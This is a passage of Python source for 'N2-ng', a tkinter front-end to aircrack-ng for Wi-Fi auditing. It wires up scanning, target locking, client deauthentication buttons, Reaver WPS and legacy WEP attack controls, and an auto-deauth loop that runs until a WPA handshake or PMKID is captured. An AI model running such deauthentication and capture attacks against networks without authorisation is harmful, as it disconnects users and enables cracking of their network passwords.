        self.text.grid(row=0, column=0, sticky="nsew")
        self.y_scrollbar.grid(row=0, column=1, sticky="ns")
        self.x_scrollbar.grid(row=1, column=0, sticky="ew")
        self.frame.grid_rowconfigure(0, weight=1)
        self.frame.grid_columnconfigure(0, weight=1)
        self.ansi = AnsiParser()
        self.ansi.configure_tags(self.text)
        self.queue = queue.Queue()
        self._proc = None
        self._thread = None
        self._running = threading.Event()

    def start(self, cmd: list[str]):
        self.stop()
        self._running.set()
        self._proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        self._thread = threading.Thread(target=self._reader, daemon=True)
        self._thread.start()

    def _reader(self):
        for line in self._proc.stdout:
            if not self._running.is_set():
                break
            self.queue.put(line.rstrip("\n"))
        self._proc.wait()

    def stop(self):
        self._running.clear()
        if self._proc:
            try:
                self._proc.terminate()
                self._proc.wait(timeout=2)
            except Exception:
                try:
                    self._proc.kill()
                except Exception:
                    pass
            self._proc = None

    def flush(self):
        """Call from tkinter main thread to drain queued lines."""
        updated = False
        while not self.queue.empty():
            try:
                line = self.queue.get_nowait()
            except queue.Empty:
                break
            self._append_line(line)
            updated = True
        return updated

    def append_lines(self, lines: list[str]):
        for line in lines:
            self._append_line(line)

    def _append_line(self, line: str):
        self.text.config(state=tk.NORMAL)
        plain, tags = self.ansi.parse(line)
        self.text.insert(tk.END, plain + "\n")
        line_start = self.text.index("end-2l linestart")
        for tag_name, start, end in tags:
            self.text.tag_add(tag_name, f"{line_start}+{start}c", f"{line_start}+{end}c")
        # Trim old lines.
        count = int(self.text.index("end-1c").split(".")[0]) - 1
        if count > self.MAX_LINES:
            self.text.delete("1.0", f"{count - self.MAX_LINES}.0")
        self.text.see(tk.END)
        self.text.config(state=tk.DISABLED)


class SettingsDialog(tk.Toplevel):
    """Modal dialog for airodump-ng settings."""

    SORT_OPTIONS = ["PWR", "Beacons", "#Data", "CH", "ESSID", "BSSID"]
    FILTER_OPTIONS = ["All", "WEP only", "WPA/WPA2 only", "WPA3 only", "Open only"]
    FORMAT_OPTIONS = ["csv", "pcap", "kismet"]

    def __init__(self, parent, settings: Settings, apply_callback, pause_state: bool = False):
        super().__init__(parent)
        self.title("Airodump Settings")
        self.configure(bg=THEME["bg"])
        self.resizable(False, False)
        self.settings = settings
        self.apply_callback = apply_callback
        self.pause_state = pause_state
        self._build()
        self.transient(parent)
        self.grab_set()

    def _build(self):
        frame = tk.Frame(self, bg=THEME["bg"])
        frame.pack(padx=10, pady=10)

        # Color output
        self.color_var = tk.BooleanVar(value=self.settings.get("color_output"))
        tk.Checkbutton(frame, text="Color output (airodump-ng --color)", variable=self.color_var, bg=THEME["bg"], fg=THEME["fg"], selectcolor=THEME["panel"]).grid(row=0, column=0, sticky=tk.W, columnspan=2)

        # Quiet mode
        self.quiet_var = tk.BooleanVar(value=self.settings.get("quiet_mode"))
        tk.Checkbutton(frame, text="Quiet mode (-q)", variable=self.quiet_var, bg=THEME["bg"], fg=THEME["fg"], selectcolor=THEME["panel"]).grid(row=1, column=0, sticky=tk.W, columnspan=2)

        self.pause_var = tk.BooleanVar(value=self.pause_state)
        tk.Checkbutton(frame, text="Pause scan", variable=self.pause_var, bg=THEME["bg"], fg=THEME["fg"], selectcolor=THEME["panel"]).grid(row=2, column=0, sticky=tk.W, columnspan=2)

        # Realtime sort
        self.realtime_var = tk.BooleanVar(value=self.settings.get("realtime_sort"))
        tk.Checkbutton(frame, text="Realtime sort", variable=self.realtime_var, bg=THEME["bg"], fg=THEME["fg"], selectcolor=THEME["panel"]).grid(row=3, column=0, sticky=tk.W, columnspan=2)

        # Show manufacturers
        self.mfg_var = tk.BooleanVar(value=self.settings.get("show_manufacturers"))
        tk.Checkbutton(frame, text="Show manufacturers (-M)", variable=self.mfg_var, bg=THEME["bg"], fg=THEME["fg"], selectcolor=THEME["panel"]).grid(row=4, column=0, sticky=tk.W, columnspan=2)

        # Sort by
        tk.Label(frame, text="Sort by:", bg=THEME["bg"], fg=THEME["fg"]).grid(row=5, column=0, sticky=tk.W)
        self.sort_var = tk.StringVar(value=self.settings.get("sort_by"))
        tk.OptionMenu(frame, self.sort_var, *self.SORT_OPTIONS).grid(row=5, column=1, sticky=tk.W)

        # Filter encryption
        tk.Label(frame, text="Filter encryption:", bg=THEME["bg"], fg=THEME["fg"]).grid(row=6, column=0, sticky=tk.W)
        self.filter_var = tk.StringVar(value=self.settings.get("filter_encryption"))
        tk.OptionMenu(frame, self.filter_var, *self.FILTER_OPTIONS).grid(row=6, column=1, sticky=tk.W)

        # Write interval
        tk.Label(frame, text="Write interval (s):", bg=THEME["bg"], fg=THEME["fg"]).grid(row=7, column=0, sticky=tk.W)
        self.interval_var = tk.IntVar(value=self.settings.get("write_interval"))
        tk.Spinbox(frame, from_=1, to=60, textvariable=self.interval_var, width=5).grid(row=7, column=1, sticky=tk.W)

        # Output formats
        tk.Label(frame, text="Output formats:", bg=THEME["bg"], fg=THEME["fg"]).grid(row=8, column=0, sticky=tk.W)
        fmt_frame = tk.Frame(frame, bg=THEME["bg"])
        fmt_frame.grid(row=8, column=1, sticky=tk.W)
        self.format_vars = {}
        for i, fmt in enumerate(self.FORMAT_OPTIONS):
            var = tk.BooleanVar(value=fmt in self.settings.get("output_formats"))
            self.format_vars[fmt] = var
            tk.Checkbutton(fmt_frame, text=fmt, variable=var, bg=THEME["bg"], fg=THEME["fg"], selectcolor=THEME["panel"]).pack(side=tk.LEFT)

        # Buttons
        btn_frame = tk.Frame(self, bg=THEME["bg"])
        btn_frame.pack(pady=10)
        tk.Button(btn_frame, text="Apply", command=self._apply, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Cancel", command=self.destroy, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)

    def _apply(self):
        formats = [fmt for fmt, var in self.format_vars.items() if var.get()]
        if "csv" not in formats:
            formats.insert(0, "csv")
        proposed = {
            "color_output": self.color_var.get(),
            "quiet_mode": self.quiet_var.get(),
            "realtime_sort": self.realtime_var.get(),
            "show_manufacturers": self.mfg_var.get(),
            "sort_by": self.sort_var.get(),
            "filter_encryption": self.filter_var.get(),
            "write_interval": self.interval_var.get(),
            "output_formats": formats,
        }
        ok, error = self.apply_callback(proposed, self.pause_var.get())
        if ok:
            self.destroy()
        else:
            self.bell()


class N2NgApp:
    """Main tkinter application."""

    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.title("N2-ng")
        self.root.geometry("1200x700")
        self.root.minsize(1000, 600)
        self.root.configure(bg=THEME["bg"])

        self.queue = queue.Queue()
        self.settings = Settings()
        self.airmon = AirmonManager()
        self.worker = AirodumpWorker(self.queue, self.settings)
        self.capture_manager = CaptureManager(self.queue, self._log)
        self.attack = AttackController(self._log)

        self.networks: dict[str, dict] = {}
        self._networks_prev: dict[str, dict] = {}
        self.clients: list[dict] = []
        self.locked_target: dict | None = None
        self.mon_iface: str | None = None
        self.current_band = tk.StringVar(value="Both")
        self.adapter_var = tk.StringVar()
        self.poll_id = None
        self._paused = False
        self._context_menu = None

        self._configure_ttk_styles()
        self._build_ui()
        self._refresh_adapters()
        self._poll_queue()
        self.root.bind_all("<Button-1>", self._dismiss_context_menu, add="+")
        self.root.bind_all("<space>", self._on_spacebar_pause, add="+")

        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
        atexit.register(self._cleanup)

    # ------------------------------------------------------------------
    # UI construction
    # ------------------------------------------------------------------
    def _configure_ttk_styles(self):
        """Apply the dark theme to ttk widgets (Treeview, Scrollbar, etc.)."""
        style = ttk.Style(self.root)
        # Prefer the clam theme because it reliably honors custom colors.
        if "clam" in style.theme_names():
            style.theme_use("clam")
        if "Consolas" in tk_font.families():
            self.mono_font = ("Consolas", 10)
            self.mono_font_bold = ("Consolas", 10, "bold")
        else:
            self.mono_font = ("Courier", 10)
            self.mono_font_bold = ("Courier", 10, "bold")
        style.configure(
            "Treeview",
            background=THEME["bg"],
            foreground=THEME["fg"],
            fieldbackground=THEME["bg"],
            font=self.mono_font,
            rowheight=18,
        )
        style.configure(
            "Treeview.Heading",
            background=THEME["panel"],
            foreground=THEME["fg"],
            font=self.mono_font_bold,
        )
        style.map(
            "Treeview",
            background=[("selected", THEME["accent"])],
            foreground=[("selected", THEME["bg"])],
        )
        style.configure(
            "Vertical.TScrollbar",
            background=THEME["panel"],
            troughcolor=THEME["bg"],
            bordercolor=THEME["bg"],
            arrowcolor=THEME["fg"],
        )
        style.configure(
            "Horizontal.TScrollbar",
            background=THEME["panel"],
            troughcolor=THEME["bg"],
            bordercolor=THEME["bg"],
            arrowcolor=THEME["fg"],
        )

    def _build_ui(self):
        self._build_toolbar()

        self.root.grid_rowconfigure(1, weight=1)
        self.root.grid_columnconfigure(0, weight=1)

        self.content_frame = tk.Frame(self.root, bg=THEME["bg"])
        self.content_frame.grid(row=1, column=0, sticky="nsew", padx=5, pady=5)
        self.content_frame.grid_rowconfigure(0, weight=1)
        self.content_frame.grid_columnconfigure(0, weight=1)
        self.content_frame.grid_columnconfigure(1, weight=1, minsize=420)

        # Left: network tree
        left_frame = tk.Frame(self.content_frame, bg=THEME["bg"])
        left_frame.grid(row=0, column=0, sticky="nsew")
        self._build_network_tree(left_frame)

        # Right: notebook with Scan and Raw View tabs
        self.notebook = ttk.Notebook(self.content_frame)
        self.notebook.grid(row=0, column=1, sticky="nsew", padx=(5, 0))
        self.notebook.configure(width=420)

        scan_tab = tk.Frame(self.notebook, bg=THEME["bg"])
        self.notebook.add(scan_tab, text="Scan")
        self._build_scrollable_right_panel(scan_tab)

        raw_tab = tk.Frame(self.notebook, bg=THEME["bg"])
        self.notebook.add(raw_tab, text="Raw View")
        self._build_raw_view(raw_tab)

        self._build_log_pane()
        self._build_status_bar()

    def _build_scrollable_right_panel(self, parent):
        """Canvas + Scrollbar wrapper for the right-side detail panel."""
        self.right_canvas = tk.Canvas(parent, bg=THEME["bg"], highlightthickness=0)
        self.right_scrollbar = ttk.Scrollbar(parent, orient=tk.VERTICAL, command=self.right_canvas.yview)
        self.right_canvas.configure(yscrollcommand=self.right_scrollbar.set)

        self.right_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.right_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        self.right_inner_frame = tk.Frame(self.right_canvas, bg=THEME["bg"], width=420)
        self.right_canvas_window = self.right_canvas.create_window((0, 0), window=self.right_inner_frame, anchor=tk.NW, width=420)

        def _on_frame_configure(event=None):
            self.right_canvas.configure(scrollregion=self.right_canvas.bbox("all"))

        def _on_canvas_configure(event=None):
            self.right_canvas.itemconfig(self.right_canvas_window, width=event.width)

        self.right_inner_frame.bind("<Configure>", _on_frame_configure)
        self.right_canvas.bind("<Configure>", _on_canvas_configure)

        self._build_right_panel(self.right_inner_frame)

    def _build_raw_view(self, parent):
        """Build the Raw View tab."""
        self.raw_view = AirodumpRawView(parent)

    def _build_toolbar(self):
        toolbar = tk.Frame(self.root, bg=THEME["panel"])
        toolbar.grid(row=0, column=0, sticky="ew", padx=5, pady=5)

        tk.Label(toolbar, text="Adapter:", bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        self.adapter_combo = ttk.Combobox(toolbar, textvariable=self.adapter_var, state="readonly", width=16)
        self.adapter_combo.pack(side=tk.LEFT, padx=5)

        tk.Label(toolbar, text="Band:", bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        self.band_combo = ttk.Combobox(
            toolbar,
            textvariable=self.current_band,
            values=("2.4GHz", "5GHz", "Both"),
            state="readonly",
            width=8,
        )
        self.band_combo.pack(side=tk.LEFT, padx=5)

        tk.Button(toolbar, text="Start Monitor", command=self._start_monitor, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        tk.Button(toolbar, text="Stop Scan", command=self._stop_scan, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        self.pause_btn = tk.Button(toolbar, text="Pause Scan", command=self._toggle_pause, bg=THEME["panel"], fg=THEME["fg"], state=tk.DISABLED)
        self.pause_btn.pack(side=tk.LEFT, padx=5)
        tk.Button(toolbar, text="Stop Monitor", command=self._stop_monitor, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        tk.Button(toolbar, text="WPS Scan", command=self._wps_scan, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        tk.Button(toolbar, text="Refresh Adapters", command=self._refresh_adapters, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        tk.Button(toolbar, text="Settings", command=self._open_settings, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)

        self.channel_pill = tk.Label(toolbar, text="SCANNING ALL", bg="red", fg="white", font=("TkDefaultFont", 10, "bold"))
        self.channel_pill.pack(side=tk.RIGHT, padx=10)

    def _build_network_tree(self, parent):
        if self.settings.get("show_manufacturers"):
            cols = ("pwr", "beacons", "data", "ch", "mb", "enc", "cipher", "auth", "mfg", "essid", "bssid")
            headings = {
                "pwr": "PWR", "beacons": "Beacons", "data": "#Data", "ch": "CH",
                "mb": "MB", "enc": "ENC", "cipher": "CIPHER", "auth": "AUTH",
                "mfg": "Manufacturer", "essid": "ESSID", "bssid": "BSSID",
            }
        else:
            cols = ("pwr", "beacons", "data", "ch", "mb", "enc", "cipher", "auth", "essid", "bssid")
            headings = {
                "pwr": "PWR", "beacons": "Beacons", "data": "#Data", "ch": "CH",
                "mb": "MB", "enc": "ENC", "cipher": "CIPHER", "auth": "AUTH",
                "essid": "ESSID", "bssid": "BSSID",
            }
        self.tree = ttk.Treeview(parent, columns=cols, show="headings", selectmode="browse")
        for c in cols:
            self.tree.heading(c, text=headings[c])
            self.tree.column(c, width=80, anchor=tk.CENTER)
        self.tree.column("essid", width=150)
        self.tree.column("bssid", width=130)
        if self.settings.get("show_manufacturers"):
            self.tree.column("mfg", width=120)

        vsb = ttk.Scrollbar(parent, orient=tk.VERTICAL, command=self.tree.yview)
        hsb = ttk.Scrollbar(parent, orient=tk.HORIZONTAL, command=self.tree.xview)
        self.tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        self.tree.grid(row=0, column=0, sticky="nsew")
        vsb.grid(row=0, column=1, sticky="ns")
        hsb.grid(row=1, column=0, sticky="ew")
        parent.grid_rowconfigure(0, weight=1)
        parent.grid_columnconfigure(0, weight=1)

        self.tree.bind("<Double-1>", self._on_network_double_click)
        self.tree.bind("<Button-3>", self._on_network_right_click)

    def _build_right_panel(self, parent):
        self.target_card = tk.LabelFrame(parent, text="Target", bg=THEME["panel"], fg=THEME["fg"])
        self.target_card.pack(fill=tk.X, padx=5, pady=5)
        self.target_label = tk.Label(self.target_card, text="No target locked", bg=THEME["panel"], fg=THEME["fg"], justify=tk.LEFT)
        self.target_label.pack(anchor=tk.W, padx=5, pady=5)
        self.size_label = tk.Label(self.target_card, text="Capture: 0 B", bg=THEME["panel"], fg=THEME["fg"])
        self.size_label.pack(anchor=tk.W, padx=5, pady=2)

        # Client table
        client_frame = tk.LabelFrame(parent, text="Clients", bg=THEME["panel"], fg=THEME["fg"])
        client_frame.pack(fill=tk.X, padx=5, pady=5)
        self.client_tree = ttk.Treeview(client_frame, columns=("station", "pwr", "pkts", "probed"), show="headings", height=5)
        for c, h in (("station", "STATION"), ("pwr", "PWR"), ("pkts", "Pkts"), ("probed", "Probed ESSID")):
            self.client_tree.heading(c, text=h)
            self.client_tree.column(c, width=90)
        self.client_tree.pack(fill=tk.X)
        self.client_tree.bind("<Button-3>", self._on_client_right_click)

        # Signal graph
        self.signal_graph = SignalGraph(parent)

        # Attack panel
        self.attack_frame = tk.LabelFrame(parent, text="Attacks", bg=THEME["panel"], fg=THEME["fg"])
        self.attack_frame.pack(fill=tk.X, padx=5, pady=5)
        tk.Button(self.attack_frame, text="Deauthenticate All Clients", command=self._deauth_all, bg="#333333", fg=THEME["accent"], font=("TkDefaultFont", 11, "bold")).pack(fill=tk.X, padx=5, pady=3)
        tk.Button(self.attack_frame, text="Deauthenticate Specific Client", command=self._deauth_client, bg="#333333", fg=THEME["accent"], font=("TkDefaultFont", 11, "bold")).pack(fill=tk.X, padx=5, pady=3)
        tk.Button(self.attack_frame, text="Reaver WPS Attack", command=self._reaver_attack, bg="#333333", fg=THEME["accent"], font=("TkDefaultFont", 11, "bold")).pack(fill=tk.X, padx=5, pady=3)
        tk.Button(self.attack_frame, text="Stop Attack", command=self._stop_attack, bg=THEME["error"], fg="#ffffff", font=("TkDefaultFont", 11, "bold")).pack(fill=tk.X, padx=5, pady=3)

        self.legacy_visible = tk.BooleanVar(value=False)
        tk.Checkbutton(self.attack_frame, text="Show Legacy WEP Attacks", variable=self.legacy_visible, command=self._toggle_legacy, bg=THEME["panel"], fg=THEME["fg"], selectcolor=THEME["panel"]).pack(anchor=tk.W, padx=5)
        self.legacy_frame = tk.LabelFrame(self.attack_frame, text="Legacy WEP Attacks", bg=THEME["panel"], fg=THEME["fg"])
        for label, kind in (("Fake Authentication", "fakeauth"), ("ARP Replay", "arpreplay"), ("Chopchop", "chopchop"), ("Fragmentation", "fragmentation")):
            tk.Button(self.legacy_frame, text=label, command=lambda k=kind: self._legacy_attack(k), bg=THEME["panel"], fg=THEME["fg"]).pack(fill=tk.X, padx=5, pady=2)

        # Auto-deauth loop for handshake capture
        auto_frame = tk.LabelFrame(parent, text="Capture Handshake", bg=THEME["panel"], fg=THEME["fg"])
        auto_frame.pack(fill=tk.X, padx=5, pady=5)
        self.auto_deauth_var = tk.BooleanVar(value=False)
        tk.Checkbutton(auto_frame, text="Auto-deauth until handshake", variable=self.auto_deauth_var, command=self._toggle_auto_deauth, bg=THEME["panel"], fg=THEME["fg"], selectcolor=THEME["panel"]).pack(anchor=tk.W, padx=5)
        interval_frame = tk.Frame(auto_frame, bg=THEME["panel"])
        interval_frame.pack(anchor=tk.W, padx=5)
        tk.Label(interval_frame, text="Interval:", bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT)
        self.deauth_interval_var = tk.StringVar(value="10")
        tk.OptionMenu(interval_frame, self.deauth_interval_var, "10", "30", "60").pack(side=tk.LEFT)
        tk.Label(interval_frame, text="seconds", bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT)

        # Capture history
        hist_frame = tk.LabelFrame(parent, text="Capture History", bg=THEME["panel"], fg=THEME["fg"])
        hist_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.history_list = tk.Listbox(hist_frame, bg=THEME["bg"], fg=THEME["fg"], selectmode=tk.EXTENDED)
        self.history_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        hsb = tk.Scrollbar(hist_frame, command=self.history_list.yview)
        hsb.pack(side=tk.RIGHT, fill=tk.Y)
        self.history_list.config(yscrollcommand=hsb.set)
        self.history_list.bind("<Button-3>", self._on_history_right_click)
        tk.Button(hist_frame, text="Refresh", command=self._refresh_history, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.BOTTOM, fill=tk.X, pady=2)

    def _toggle_legacy(self):
        if self.legacy_visible.get():
            self.legacy_frame.pack(fill=tk.X, padx=5, pady=5)
        else:
            self.legacy_frame.pack_forget()

    def _on_spacebar_pause(self, event):
        widget_class = event.widget.winfo_class() if getattr(event, "widget", None) else ""
        if widget_class in {"Entry", "Spinbox", "TCombobox"}:
            return None
        if not self.worker._proc:
            return None
        self._toggle_pause()
        return "break"

    def _build_log_pane(self):
        log_frame = tk.LabelFrame(self.root, text="Log", bg=THEME["panel"], fg=THEME["fg"], height=120)
        log_frame.grid(row=2, column=0, sticky="ew", padx=5, pady=(0, 5))
        log_frame.grid_propagate(False)
        log_frame.grid_rowconfigure(0, weight=1)
        log_frame.grid_columnconfigure(0, weight=1)
        self.log_text = tk.Text(log_frame, height=6, bg=THEME["bg"], fg=THEME["fg"], state=tk.DISABLED)
        self.log_text.grid(row=0, column=0, sticky="nsew")
        sb = tk.Scrollbar(log_frame, command=self.log_text.yview)
        sb.grid(row=0, column=1, sticky="ns")
        self.log_text.config(yscrollcommand=sb.set)

    def _build_status_bar(self):
        self.status = tk.Label(self.root, text="Ready", bg=THEME["panel"], fg=THEME["fg"], anchor=tk.W)
        self.status.grid(row=3, column=0, sticky="ew")

    # ------------------------------------------------------------------
    # Event handling
    # ------------------------------------------------------------------
    def _check_dependencies(self):
        statuses = DependencyChecker.check_all()
        missing = [name for name, status in statuses.items() if not status["installed"]]
        if missing:
            names = ", ".join(missing)
            install_lines = "\n".join(statuses[name]["apt"] for name in missing)
            msg = (
                f"Missing optional/required tools: {names}\n\n"
                "Install with:\n"
                f"{install_lines}"
            )
            self._log(f"Missing dependencies: {names}")
            messagebox.showwarning("N2-ng Dependencies", msg)
        else:
            self._log("All dependencies satisfied")

    def _refresh_adapters(self):
        ifaces = self.airmon.list_physical_interfaces()
        self.adapter_combo["values"] = tuple(ifaces)
        if ifaces and not self.adapter_var.get():
            self.adapter_var.set(ifaces[0])

    def _start_monitor(self):
        iface = self.adapter_var.get()
        if not iface:
            messagebox.showwarning("N2-ng", "No adapter selected.")
            return
        self._log(f"Starting monitor mode on {iface}")
        try:
            self.mon_iface = self.airmon.start_monitor(iface)
            self.status.config(text=f"Monitor: {self.mon_iface}")
            ok, error = self.worker.start_scan(self.mon_iface, self.current_band.get(), scan_prefix())
            if not ok:
                failed_iface = self.mon_iface
                self.mon_iface = None
                self.airmon.stop_monitor(failed_iface)
                self.pause_btn.config(text="Pause Scan", state=tk.DISABLED)
                self.status.config(text=f"Scan failed: {error}", bg="red", fg="white")
                return
            self.pause_btn.config(text="Pause Scan", state=tk.NORMAL)
        except Exception as e:
            messagebox.showerror("N2-ng", f"Failed to start monitor mode: {e}")

    def _stop_monitor(self):
        self.worker.stop()
        self.worker.clear_latest()
        if self.mon_iface:
            self.airmon.stop_monitor(self.mon_iface)
            self.mon_iface = None
        self.status.config(text="Monitor stopped")
        self.channel_pill.config(text="SCANNING ALL", bg="red")
        self.pause_btn.config(text="Pause Scan", state=tk.DISABLED)

    def _stop_scan(self):
        self.worker.stop()
        self.worker.clear_latest()
        self.networks.clear()
        self._networks_prev.clear()
        self.clients = []
        self.locked_target = None
        self.tree.delete(*self.tree.get_children())
        self.client_tree.delete(*self.client_tree.get_children())
        self.target_label.config(text="No target locked")
        self.size_label.config(text="Capture: 0 B")
        self.channel_pill.config(text="SCANNING ALL", bg="red")
        self.pause_btn.config(text="Pause Scan", state=tk.DISABLED)
        self.status.config(text="Scan stopped", bg=THEME["panel"], fg=THEME["fg"])

    def _wps_scan(self):
        if not self.mon_iface:
            messagebox.showwarning("N2-ng", "Start monitor mode first.")
            return
        self._log("Starting WPS scan...")
        self.wps_lines = []
        self.wps_dialog = tk.Toplevel(self.root)
        self.wps_dialog.title("WPS Scan")
        self.wps_dialog.configure(bg=THEME["bg"])
        self.wps_dialog.geometry("700x400")
        text = tk.Text(self.wps_dialog, bg=THEME["bg"], fg=THEME["fg"], state=tk.DISABLED)
        text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.wps_text = text
        self.wps_scanner = WpsScanner(self.mon_iface, self._on_wps_event)
        self.wps_scanner.start()
        tk.Button(self.wps_dialog, text="Stop", command=self._stop_wps_scan, bg=THEME["panel"], fg=THEME["fg"]).pack(pady=5)

    def _on_wps_event(self, event, payload):
        if event == "wps_line":
            self.wps_lines.append(payload)
            self.root.after(0, self._update_wps_text)
        elif event == "error":
            self._log(f"WPS scan error: {payload}")

    def _update_wps_text(self):
        if hasattr(self, "wps_text") and self.wps_text.winfo_exists():
            self.wps_text.config(state=tk.NORMAL)
            self.wps_text.delete("1.0", tk.END)
            self.wps_text.insert(tk.END, "\n".join(self.wps_lines[-200:]))
            self.wps_text.see(tk.END)
            self.wps_text.config(state=tk.DISABLED)

    def _stop_wps_scan(self):
        if hasattr(self, "wps_scanner"):
            self.wps_scanner.stop()
        if hasattr(self, "wps_dialog") and self.wps_dialog.winfo_exists():
            self.wps_dialog.destroy()

    def _open_settings(self):
        SettingsDialog(self.root, self.settings, self._apply_settings, pause_state=self.worker.is_paused())

    def _apply_settings(self, proposed: dict, pause_requested: bool) -> tuple[bool, str | None]:
        """Apply staged settings, rolling them back if an active scan cannot restart."""
        previous = dict(self.settings.data)
        restart_keys = {"color_output", "quiet_mode", "write_interval", "output_formats", "show_manufacturers"}
        restart_required = any(previous.get(key) != proposed.get(key) for key in restart_keys)
        self.settings.data.update(proposed)

        if restart_required and self.worker.is_running():
            ok, error = self.worker.restart_with_settings()
            if not ok:
                self.settings.data = previous
                # Best-effort restoration of the old command; the original error is
                # the actionable failure reported to the user.
                self.worker.restart_with_settings()
                self.status.config(text=f"Settings not applied: {error}", bg="red", fg="white")
                return False, error

        self._rebuild_tree_if_needed()
        self._refresh_tree(force_sort=True)
        if pause_requested and not self.worker.is_paused():
            self.worker.pause()
        elif not pause_requested and self.worker.is_paused():
            self.worker.resume()

        ok, error = self.settings.save()
        if not ok:
            self.status.config(text=f"Settings not saved: {error}", bg="red", fg="white")
            return False, error
        self.status.config(text="Settings applied", bg=THEME["panel"], fg=THEME["fg"])
        self._log("Settings applied")
        return True, None

    def _rebuild_tree_if_needed(self):
        # Determine if manufacturer column state changed
        has_mfg = self.settings.get("show_manufacturers")
        current_cols = self.tree["columns"]
        has_mfg_col = "mfg" in current_cols
        if has_mfg != has_mfg_col:
            # Rebuild treeview
            parent = self.tree.master
            self.tree.destroy()
            self._build_network_tree(parent)

    def _toggle_pause(self):
        if not self.worker._proc:
            return
        if self.worker.is_paused():
            self.worker.resume()
            self.pause_btn.config(text="Pause Scan")
            self._log("Scan resumed")
        else:
            self.worker.pause()
            self.pause_btn.config(text="Resume Scan")
            self._log("Scan paused")

    def _toggle_auto_deauth(self):
        if self.auto_deauth_var.get():
            if not self.locked_target or not self.mon_iface:
                messagebox.showwarning("N2-ng", "Lock a target first.")
                self.auto_deauth_var.set(False)
                return
            self._log("Auto-deauth loop started")
            self._auto_deauth_tick()
        else:
            self._log("Auto-deauth loop stopped")

    def _auto_deauth_tick(self):
        if not self.auto_deauth_var.get() or not self.locked_target or not self.mon_iface:
            return
        if self.capture_manager and (self.capture_manager.handshake_found or self.capture_manager.pmkid_found):
            self._log("Handshake/PMKID captured, stopping auto-deauth")
            self.auto_deauth_var.set(False)
            return
        bssid = self.locked_target["bssid"]
        self.attack.deauth_all(bssid, self.mon_iface, count=5)
        interval = int(self.deauth_interval_var.get()) * 1000
        self.root.after(interval, self._auto_deauth_tick)

    def _on_network_double_click(self, event):
        item = self.tree.selection()
        if not item:
            return
        bssid = self.tree.item(item[0], "values")[-1]
        self._lock_target(bssid)

    def _on_network_right_click(self, event):
        item = self.tree.identify_row(event.y)
        if not item:
            return
        self.tree.selection_set(item)
        bssid = self.tree.item(item, "values")[-1]
        essid = self.tree.item(item, "values")[-2]
        menu = tk.Menu(self.root, tearoff=0, bg=THEME["panel"], fg=THEME["fg"])
        menu.add_command(label="Copy BSSID", command=lambda: self._copy_to_clipboard(bssid))
        menu.add_command(label="Copy ESSID", command=lambda: self._copy_to_clipboard(essid))
        menu.add_command(label="Lock Target", command=lambda: self._lock_target(bssid))
        self._post_context_menu(menu, event.x_root, event.y_root)

    def _on_client_right_click(self, event):
        item = self.client_tree.identify_row(event.y)
        if not item:
            return
        self.client_tree.selection_set(item)
        station = self.client_tree.item(item, "values")[0]
        menu = tk.Menu(self.root, tearoff=0, bg=THEME["panel"], fg=THEME["fg"])
        menu.add_command(label="Copy Client MAC", command=lambda: self._copy_to_clipboard(station))
        menu.add_command(label="Deauth This Client", command=lambda: self._deauth_client_by_station(station))
        self._post_context_menu(menu, event.x_root, event.y_root)

    def _post_context_menu(self, menu: tk.Menu, x: int, y: int):
        self._dismiss_context_menu()
        self._context_menu = menu
        menu.post(x, y)

    def _dismiss_context_menu(self, _event=None):
        menu = self._context_menu
        if not menu:
            return
        if _event is not None:
            widget = getattr(_event, "widget", None)
            if widget is menu or (widget is not None and str(widget).startswith(str(menu))):
                return
        try:
            if menu.winfo_exists():
                menu.unpost()
                menu.destroy()
        except tk.TclError:
            pass
        self._context_menu = None

    def _copy_to_clipboard(self, text: str):
        self.root.clipboard_clear()
        self.root.clipboard_append(text)

    def _lock_target(self, bssid: str):
        net = self.networks.get(bssid)
        if not net:
            return
        if not self.mon_iface:
            messagebox.showwarning("N2-ng", "Start monitor mode first.")
            return
        self.locked_target = net
        ch = net.get("channel", "1")
        # Set system channel to prevent aireplay-ng mismatch
        subprocess.run(["iw", "dev", self.mon_iface, "set", "channel", str(ch)], capture_output=True)
        prefix = target_capture_prefix(net["essid"], bssid)
        ok, error = self.worker.start_lock(self.mon_iface, int(ch), bssid, prefix)
        if not ok:
            self.locked_target = None
            self.status.config(text=f"Target lock failed: {error}", bg="red", fg="white")
            self.pause_btn.config(text="Pause Scan", state=tk.DISABLED)
            return
        self.pause_btn.config(text="Pause Scan", state=tk.NORMAL)
        self.capture_manager.set_active_cap(Path(f"{prefix}-01.cap"))
        self._poll_capture()
        self.channel_pill.config(text=f"LOCKED: CH {ch}", bg="green")
        self._update_target_card(net)
        self._log(f"Locked target {net['essid']} ({bssid}) on channel {ch}")
        self._start_capture_size_monitor()
        self._refresh_history()

    def _unlock_target(self):
        self.locked_target = None
        self.channel_pill.config(text="SCANNING ALL", bg="red")
        self.target_label.config(text="No target locked")
        self.size_label.config(text="Capture: 0 B")
        self.client_tree.delete(*self.client_tree.get_children())
        self.worker.stop()
        if self.mon_iface:
